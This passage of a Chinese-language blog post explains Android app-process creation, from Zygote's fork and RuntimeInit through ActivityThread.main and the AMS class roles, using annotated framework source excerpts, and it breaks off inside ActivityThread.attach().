app_main.onZygoteInit()"></a>3.4.17 app_main.onZygoteInit()</h4><p>源码位于 frameworks/base/cmds/app_process/app_main.cpp</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">virtual void onZygoteInit()<br>&#123;<br>    sp&lt;ProcessState&gt; <span class="hljs-built_in">proc</span> = ProcessState::<span class="hljs-keyword">self</span>();<br>    <span class="hljs-built_in">proc</span>-&gt;startThreadPool(); <span class="hljs-regexp">//</span>启动新binder线程<br>&#125;<br></code></pre></td></tr></table></figure><p>ProcessState::self():主要工作是调用open()打开/dev/binder驱动设备，再利用mmap()映射内核的地址空间，将Binder驱动的fd赋值ProcessState对象中的变量mDriverFD，用于交互操作。startThreadPool()是创建一个新的binder线程，不断进行talkWithDriver()，与Binder驱动交流</p><p>继续执行zygoteInit方法中的最后一个方法</p><h4 id="3-4-18-RuntimeInit-applicationInit"><a href="#3-4-18-RuntimeInit-applicationInit" class="headerlink" title="3.4.18 RuntimeInit.applicationInit()"></a>3.4.18 RuntimeInit.applicationInit()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static void application<span class="hljs-constructor">Init(<span class="hljs-params">int</span> <span class="hljs-params">targetSdkVersion</span>, String[] <span class="hljs-params">argv</span>, ClassLoader <span class="hljs-params">classLoader</span>)</span><br>        throws ZygoteInit.MethodAndArgsCaller &#123;<br>    <span class="hljs-comment">//true代表应用程序退出时不调用AppRuntime.onExit()，否则会在退出前调用</span><br>    native<span class="hljs-constructor">SetExitWithoutCleanup(<span class="hljs-params">true</span>)</span>;<br><br>    <span class="hljs-comment">//设置虚拟机的内存利用率参数值为0.75</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VMRuntime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.set<span class="hljs-constructor">TargetHeapUtilization(0.75f)</span>;<br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">VMRuntime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.set<span class="hljs-constructor">TargetSdkVersion(<span class="hljs-params">targetSdkVersion</span>)</span>;<br><br>    final Arguments args;<br>    <span class="hljs-keyword">try</span> &#123;<br>        args = <span class="hljs-keyword">new</span> <span class="hljs-constructor">Arguments(<span class="hljs-params">argv</span>)</span>; <span class="hljs-comment">//解析参数</span><br>    &#125; catch (IllegalArgumentException ex) &#123;<br>        return;<br>    &#125;<br><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Trace</span>.</span></span>trace<span class="hljs-constructor">End(Trace.TRACE_TAG_ACTIVITY_MANAGER)</span>;<br><br>    <span class="hljs-comment">//调用startClass的static方法 main() 此处args.startClass为”android.app.ActivityThread”</span><br>    invoke<span class="hljs-constructor">StaticMain(<span class="hljs-params">args</span>.<span class="hljs-params">startClass</span>, <span class="hljs-params">args</span>.<span class="hljs-params">startArgs</span>, <span class="hljs-params">classLoader</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="3-4-19-RuntimeInit-invokeStaticMain"><a href="#3-4-19-RuntimeInit-invokeStaticMain" class="headerlink" title="3.4.19 RuntimeInit.invokeStaticMain()"></a>3.4.19 RuntimeInit.invokeStaticMain()</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">private</span> static void invoke<span class="hljs-constructor">StaticMain(String <span class="hljs-params">className</span>, String[] <span class="hljs-params">argv</span>, ClassLoader <span class="hljs-params">classLoader</span>)</span><br>        throws ZygoteInit.MethodAndArgsCaller &#123;<br>    Class&lt;?&gt; cl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-params">className</span>, <span class="hljs-params">true</span>, <span class="hljs-params">classLoader</span>)</span>;<span class="hljs-operator"></span><br><span class="hljs-operator">    ...</span><br><span class="hljs-operator"></span><br><span class="hljs-operator">    </span>Method m;<br>    <span class="hljs-keyword">try</span> &#123;<br>        m = cl.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;main&quot;</span>, <span class="hljs-params">new</span> Class[] &#123; String[].<span class="hljs-params">class</span> &#125;)</span>;<br>    &#125; catch (NoSuchMethodException ex) &#123;<span class="hljs-operator"></span><br><span class="hljs-operator">        ...</span><br><span class="hljs-operator">    </span>&#125; catch (SecurityException ex) &#123;<span class="hljs-operator"></span><br><span class="hljs-operator">        ...</span><br><span class="hljs-operator">    </span>&#125;<br><br>    <span class="hljs-comment">//通过抛出异常，回到ZygoteInit.main()。这样做好处是能清空栈帧，提高栈帧利用率</span><br>    throw <span class="hljs-keyword">new</span> ZygoteInit.<span class="hljs-constructor">MethodAndArgsCaller(<span class="hljs-params">m</span>, <span class="hljs-params">argv</span>)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>重点看最后一个方法，通过反射获取ActivityThread类的main方法参数，然后抛出MethodAndArgsCaller异常，其中构造方法中m是指main方法，argv是AMS发送过来的参数列表；但是抛出异常后怎么弄呢，我们知道一个方法抛异常，会一直往上走到调用方法，直到一个方法捕获了异常。在这里就会一直抛到ZygoteInit.main方法才捕获了异常，然后去执行MethodAndArgsCaller.run方法</p><h4 id="3-4-20-MethodAndArgsCaller-run"><a href="#3-4-20-MethodAndArgsCaller-run" class="headerlink" title="3.4.20 MethodAndArgsCaller.run()"></a>3.4.20 MethodAndArgsCaller.run()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MethodAndArgsCaller</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Exception</span></span><br><span class="hljs-class">            <span class="hljs-keyword">implements</span> <span class="hljs-title">Runnable</span> </span>&#123;<br>        <span class="hljs-comment">/** 调用的方法 在上面的方法可知是main方法 */</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Method mMethod;<br><br>        <span class="hljs-comment">/** 参数列表 */</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">String</span>[] mArgs;<br><br>        <span class="hljs-keyword">public</span> MethodAndArgsCaller(Method method, <span class="hljs-keyword">String</span>[] args) &#123;<br>            mMethod = method;<br>            mArgs = args;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> run() &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//反射调用，由上面可知这里会调用到ActivityThread.main()方法</span><br>                mMethod.invoke(<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">Object</span>[] &#123; mArgs &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(ex);<br>            &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>                <span class="hljs-built_in">Throwable</span> cause = ex.getCause();<br>                <span class="hljs-keyword">if</span> (cause <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">RuntimeException</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-built_in">RuntimeException</span>) cause;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cause <span class="hljs-keyword">instanceof</span> <span class="hljs-built_in">Error</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-built_in">Error</span>) cause;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(ex);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>走到这里就要进入ActivityThread了，它管理着应用程序进程中主线程的执行，在ActivityManager请求时调度和执行Activity，Service，Broadcast和其它操作</p><h4 id="3-4-21-ActivityThread-main"><a href="#3-4-21-ActivityThread-main" class="headerlink" title="3.4.21 ActivityThread.main()"></a>3.4.21 ActivityThread.main()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">String</span>[] args)</span> </span>&#123;<br><br>......<br><span class="hljs-comment">//创建主线程的Looper</span><br>        Looper.<span class="hljs-built_in">prepareMainLooper</span>();<br><span class="hljs-comment">//关联AMS</span><br>        ActivityThread thread = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ActivityThread</span>();<br>        thread.<span class="hljs-built_in">attach</span>(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">//初始化主线程Handler</span><br>        <span class="hljs-keyword">if</span> (sMainThreadHandler == null) &#123;<br>            sMainThreadHandler = thread.<span class="hljs-built_in">getHandler</span>();<br>        &#125;<br><br>        <span class="hljs-comment">// 进行主线程消息循环</span><br>        Looper.<span class="hljs-built_in">loop</span>();<br><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">&quot;Main thread loop unexpectedly exited&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p>主要工作：设置进程名，打开binder驱动，启动新的binder线程；然后设置art虚拟机参数，再反射调用目标类的main()方法，即ActivityThread.main()方法</p><p>至此，进程创建完毕，并且也有了主线程，剩下的便是启动Activity和关联context等初始化操作了</p><h4 id="3-4-22-回调zygote进程ZygoteConnection-handleParentProc"><a href="#3-4-22-回调zygote进程ZygoteConnection-handleParentProc" class="headerlink" title="3.4.22 回调zygote进程ZygoteConnection.handleParentProc()"></a>3.4.22 回调zygote进程ZygoteConnection.handleParentProc()</h4><p>子进程fork方法执行完成回调第一次给子进程后，还会回调一次给zygote进程</p><p>具体是在ZygoteConnection.runOnce中调用handleParentProc</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">handleParentProc</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pid,</span></span><br><span class="hljs-params"><span class="hljs-function">            FileDescriptor[] descriptors, FileDescriptor pipeFd, Arguments parsedArgs)</span> </span>&#123;<br><br>        <span class="hljs-keyword">if</span> (pid &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">setChildPgid</span>(pid);<br>        &#125;<br>       ....<br>        <span class="hljs-keyword">try</span> &#123;<br>        <br>            mSocketOutStream.<span class="hljs-built_in">writeInt</span>(pid);<br>            mSocketOutStream.<span class="hljs-built_in">writeBoolean</span>(usingWrapper);<br>        &#125; <span class="hljs-built_in"><span class="hljs-keyword">catch</span></span> (IOException ex) &#123;<br>            Log.<span class="hljs-built_in">e</span>(TAG, <span class="hljs-string">&quot;Error writing to command socket&quot;</span>, ex);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法主要是为了通知system server进程，新进程已经创建完成</p> <img src="/2021/08/23/android%E5%BC%80%E6%9C%BA%E5%90%8E%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/images/systemserver.png" class=""><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><ul><li>APP或者桌面启动，需要使用Binder机制告诉AMS（因为启动方有自己的进程，AMS在system server进程），AMS请求zygote进程是通过Socket</li><li>Process.start方法是阻塞的，只有等进程创建完成才会返回</li><li>zygote进程fork进程一次，会有两次返回，在zygote进程和子进程分别返回一次，这样子线程就能执行ZygoteConnection.handleChildProc及以后的逻辑；zygote进程通过ZygoteConnection.handleParentProc通知system server进程新进程已经创建完成</li></ul><h5 id="fork解释"><a href="#fork解释" class="headerlink" title="fork解释"></a>fork解释</h5><p>可能你会疑虑，明明是在zygote进程中的ZygoteConnection.runOnce方法中去执行fork操作，那么fork结束后返回不应该还是在zygote进程中吗？</p><p>这里需要了解下fork的逻辑：</p><p>fork()采用copy on write技术，这是linux创建进程的标准方法，调用一次，返回两次。当父子进程任一方修改内存数据时（这是on-write时机），才发生缺页中断，从而分配新的物理内存（这是copy操作）。<br>copy-on-write原理：写时拷贝是指子进程与父进程的页表都所指向同一个块物理内存，fork过程只拷贝父进程的页表，并标记这些页表是只读的。父子进程共用同一份物理内存，如果父子进程任一方想要修改这块物理内存，那么会触发缺页异常(page fault)，Linux收到该中断便会创建新的物理内存，并将两个物理内存标记设置为可写状态，从而父子进程都有各自独立的物理内存。</p><p>其实就是fork之后，操作系统会复制一个与父进程完全相同的子进程，虽说是父子关系，但是在操作系统看来，他们更像兄弟关系，这2个进程共享代码空间，但是数据空间是互相独立的，子进程数据空间中的内容是父进程的完整拷贝，指令指针也完全相同，子进程拥有父进程当前运行到的位置（两进程的程序计数器pc值相同，也就是说，子进程是从fork返回处开始执行的）</p><p>可以这样想象，子进程就是把zygote进程复制了一遍，两个进程都阻塞在这里；但在fork之后，他们就开始分别作不同的工作，正如fork原意【分支】一样，在zygote进程的ZygoteConnection.runOnce方法中，fork返回子进程id，然后执行ZygoteConnection.handleParentProc；但是在子进程的ZygoteConnection.runOnce方法中，fork返回是0，就会去执行ZygoteConnection.handleChildProc；这样父子进程从此分家</p><h2 id="4-ActivityThrad的工作逻辑"><a href="#4-ActivityThrad的工作逻辑" class="headerlink" title="4. ActivityThrad的工作逻辑"></a>4. ActivityThrad的工作逻辑</h2><h3 id="4-1-前言"><a href="#4-1-前言" class="headerlink" title="4.1 前言"></a>4.1 前言</h3><p>我们知道在Sun的Java体系中和C语言中的类或者程序入口点都是main方法，那我们的Android程序入口是不是也是某个类的main方法呢？</p><p>有一点很奇怪的是，我们平时开发中好像没接触过main方法，基本上都是与四大组件（还有一个Fragment）和Application打交道；要想弄清楚这是怎么回事，就必须要了解下当你点击手机桌面上某个APP的icon后，它是怎么从无到有运行在你的眼前的呢？</p><p>当一个应用进程被创建之后，会把ActivityThread这个类加载到新的进程中来，接下来这个应用的一切操作（比如Activity的创建启动）就从ActivityThread这个类开始展开</p><h3 id="4-2-类简称"><a href="#4-2-类简称" class="headerlink" title="4.2 类简称"></a>4.2 类简称</h3><ul><li>ActivityManagerService：AMS</li><li>ActivityManagerNative：AMN</li><li>ActivityManagerProxy：AMP</li><li>ActivityThread ：AT</li><li>ApplicationThread：APT</li><li>ApplicationThreadNative：ATN</li><li>ApplicationThreadProxy：ATP</li><li>ActivityStackSupervisor：ASS</li></ul><h3 id="4-3-类简介"><a href="#4-3-类简介" class="headerlink" title="4.3 类简介"></a>4.3 类简介</h3><p>这个章节的分析将会接触到大量跨进程通信，需要用到AIDL，其中涉及到的类及Activity启动相关类如下，AIDL的实现模式都是固定的</p><h4 id="4-3-1"><a href="#4-3-1" class="headerlink" title="4.3.1"></a>4.3.1</h4><ul><li>IActivityManager：作为应用进程请求系统进程的接口，这时候应用进程是客户端进程，系统进程是服务端进程，客户端和服务端进程都实现且遵循这个接口规则</li><li>ActivityManagerNative：作为服务端的“桩(Stub)”，其主要职责就是对远程（客户端进程）传递过来的数据进行”反序列化(unparcel)”</li><li>ActivityManagerProxy：作为服务的“代理(Proxy)”,运行在客户端进程，其主要职责就是将数据进行“序列化(parcel)”，再传递给远程的“桩(Stub)”</li><li>ActivityManagerService：IActivityManager接口中定义的业务的具体实现，运行在服务端，对“桩(Stub)”做了继承扩展</li></ul><h4 id="4-3-2"><a href="#4-3-2" class="headerlink" title="4.3.2"></a>4.3.2</h4><ul><li>IApplicationThread: 作为系统进程请求应用进程的接口，这时候应用进程是服务端进程，系统进程是客户端进程，客户端和服务端进程都实现且遵循这个接口规则</li><li>ApplicationThreadNative：同理于ActivityManagerNative</li><li>ApplicationThreadProxy：同理于ActivityManagerProxy</li><li>ApplicationThread：同理于ActivityManagerService，负责响应系统进程发起的请求，帮助AMS管理相关Application中的Activity的生命周期，是ActivityThread内部类（ActivityThread是应用进程的主线程），接收到系统进程请求后通过Handler往主线程发消息，这样ApplicationThread就轻松将具体执行任务的工作转交给了主线程，用来实现AMS和AT之间的交互</li></ul><h4 id="4-3-3"><a href="#4-3-3" class="headerlink" title="4.3.3"></a>4.3.3</h4><ul><li>ProcessRecord：保存了进程运行时的信息，AMS通过ProcessRecord来维护进程运行时的状态信息，需要将应用进程绑定到ProcessRecord才能开始一个Application的构建（每个应用进程在AMS对应一个ProcessRecord）</li><li>ActivityRecord：保存Activity运行时的信息，AMS通过ActivityRecord来维护Activity运行时的状态信息，需要将Activity绑定到AMS中的ActivityRecord才能开始Activity的生命周期（每个Activity在AMS对应一个ActivityRecord，其实就是服务器端的Activity对象的映像）</li><li>TaskRecord：AMS抽象出来的一个Task的概念，是记录ActivityRecord的栈，一个“Task”包含若干个ActivityRecord。AMS用TaskRecord确保Activity启动和退出的顺序，如果了解过Activity的启动模式就知道这个用处了</li><li>ActivityStack：AMS对Activity设计的一种堆栈机制用于管理Activity，为了让这许多Activity协同工作而不至于产生混乱，其遵循先进后出的原则，系统总是显示位于栈顶的Activity</li></ul><h4 id="4-3-4"><a href="#4-3-4" class="headerlink" title="4.3.4"></a>4.3.4</h4><ul><li>ActivityThread：APP的入口类，从main方法开始执行，就是大家口中的UI线程或者主线程，与AMS一起完成四大组件的工作</li><li>Instrumentation：每一个应用程序只有一个Instrumentation实例，在BindApplication创建的，每个Activity内部拥有一个该对象的引用，ActivityThread对组件的操作最后都是交给它去做具体的执行</li></ul><h4 id="4-3-5"><a href="#4-3-5" class="headerlink" title="4.3.5"></a>4.3.5</h4><ul><li>ApplicationInfo：保存了应用程序的信息，包括AndroidManifest.xml中检索的信息</li><li>Context：Activity的上下文</li><li>ContextWrapper：继承Context，为了使用方便，对Context进行包装，而无需修改Context，内部包含一个真正的Context引用，调用ContextWrapper的方法都会被转向其所包含的真正的Context对象，即ContextImpl对象</li><li>Application：继承ContextWrapper，ActivityThread的上下文，用户可以继承它自定义自己的Application类，用于维护全局应用程序状态的基类</li><li>ContextImpl：继承Context，真正实现了Context中所有函数，应用程序中调用的各种Context类的方法，其实现均来自于该类；它为Activity和其他应用程序组件提供基本上下文对象</li></ul> <img src="/2021/08/23/android%E5%BC%80%E6%9C%BA%E5%90%8E%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/images/Context.png" class=""><h4 id="4-3-6-代理和桩的理解"><a href="#4-3-6-代理和桩的理解" class="headerlink" title="4.3.6 代理和桩的理解"></a>4.3.6 代理和桩的理解</h4><p>“代理(Proxy)”和“桩(Stub)”是Binder接口实现时成对出现的概念。可以对应到一个生活中的例子：银行的取款机就像是银行的业务代理(Proxy)，客户只需要通过取款机，就能方便地完成存、取款等业务。对于客户来说，不用关心银行是什么样，钱到哪去了，只要通过代理能完成自己的业务就行了；对于取款机这个代理而言，它需要连接银行的服务器(Stub)，完成数据传递，将客户的操作反馈到中心</p><h3 id="4-4-ActivityThread入口"><a href="#4-4-ActivityThread入口" class="headerlink" title="4.4 ActivityThread入口"></a>4.4 ActivityThread入口</h3><p>源码位于frameworks/base/core/java/android/app/ActivityThread.java</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public static void main(String<span class="hljs-literal">[]</span> args) &#123;<br><br>......<br><br><span class="hljs-comment">//实例化了UserEnvironment，便于访问存储路径</span><br><span class="hljs-comment">//像平时使用的Environment.getExternalStorageDirectory出自UserEnvironment类</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Environment</span>.</span></span>init<span class="hljs-constructor">ForCurrentUser()</span>;<br><br>        <span class="hljs-comment">// 设置路径 确保用户能正确访问CA证书</span><br>        final File configDir = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Environment</span>.</span></span>get<span class="hljs-constructor">UserConfigDirectory(UserHandle.<span class="hljs-params">myUserId</span>()</span>);<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TrustedCertificateStore</span>.</span></span>set<span class="hljs-constructor">DefaultUserDirectory(<span class="hljs-params">configDir</span>)</span>;<br><br><span class="hljs-comment">//设置进程名，Process类是进程管理器</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Process</span>.</span></span>set<span class="hljs-constructor">ArgV0(<span class="hljs-string">&quot;&lt;pre-initialized&gt;&quot;</span>)</span>;<br><br><span class="hljs-comment">//创建主线程的Looper</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Looper</span>.</span></span>prepare<span class="hljs-constructor">MainLooper()</span>;<br><br><span class="hljs-comment">//创建ActivityThread 对象，并关联到AMS</span><br>        ActivityThread thread = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ActivityThread()</span>;<br>        thread.attach(<span class="hljs-literal">false</span>);<br><br><span class="hljs-comment">//对主线程Handler赋值</span><br>        <span class="hljs-keyword">if</span> (sMainThreadHandler<span class="hljs-operator"> == </span>null) &#123;<br>            sMainThreadHandler = thread.get<span class="hljs-constructor">Handler()</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 开启主线程循环器，不断的读取消息 派发处理消息</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Looper</span>.</span></span>loop<span class="hljs-literal">()</span>;<br><br>        throw <span class="hljs-keyword">new</span> <span class="hljs-constructor">RuntimeException(<span class="hljs-string">&quot;Main thread loop unexpectedly exited&quot;</span>)</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这个方法三处比较重要</p><ul><li><p>创建主线程的Looper，并调用Loop方法，这样主线程就有了自己的消息队列并不停的从中取消息，然后处理</p></li><li><p>创建ActivityThread 对象，这个过程中会实例化几个重要的成员变量</p><ul><li>ApplicationThread mAppThread = new ApplicationThread()</li><li>Looper mLooper = Looper.myLooper() 获取主线程的Looper</li><li>H mH = new H() H继承Handler，用来处理组件的生命周期</li></ul></li><li><p>调用attach方法，这个方法很重要，看下方</p></li></ul><h4 id="4-4-1-AT-attach"><a href="#4-4-1-AT-attach" class="headerlink" title="4.4.1 AT.attach()"></a>4.4.1 AT.attach()</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">private</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">attach</span>(<span class="hljs-params"><span class="hljs-built_in">boolean</span> system</span>)</span> &#123;<br>        sCurrentActivityThread = <span class="hljs-built_in">this</span>;<br>        mSystemThread = system;<span class="hljs-comment">//mSystemThread表明是system app 还是普通app</span><br>        <span class="hljs-keyword">if</span> (!system) &#123; <span class="hljs-comment">//main方法传入的是false</span><br>            ViewRootImpl.addFirstDrawHandler(<span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-title">Runnable</span>(<span class="hljs-params"></span>)</span> &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span> &#123;<br>                <span class="hljs-comment">//开启JIT</span><br>                    ensureJitEnabled();<br>                &#125;<br>            &#125;);<br>            android.ddm.DdmHandleAppName.setAppName(<span class="hljs-string">&quot;&lt;pre-initialized&gt;&quot;</span>,<br>                                                    UserHandle.myUserId());<br>            <span class="hljs-comment">//设置标识此应用程序/进程的对象，以报告VM错误。</span><br>            RuntimeInit.setApplicationObject(mAppThread.asBinder());<br>            <span class="hljs-comment">//创建ActivityManagerProxy对象</span><br>            final IActivityManager mgr = ActivityManagerNative.getDefault();<br>            <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过Binder跨进程调用AMS中的attachApplication</span><br>                mgr.attachApplication(mAppThread);<br>            &#125; <span class="hljs-keyword">catch</span> (RemoteException ex) &#123;<br>                <span class="hljs-keyword">throw</span> ex.rethrowFromSystemServer();<br>            &#125;<br>            <span class="hljs-comment">//观察是否到heap内存上限</span><br>            BinderInternal.addGcWatcher(<span class="hljs-keyword">new</span> <span class="hljs-function"><span class="hljs-title">Runnable</span>(<span 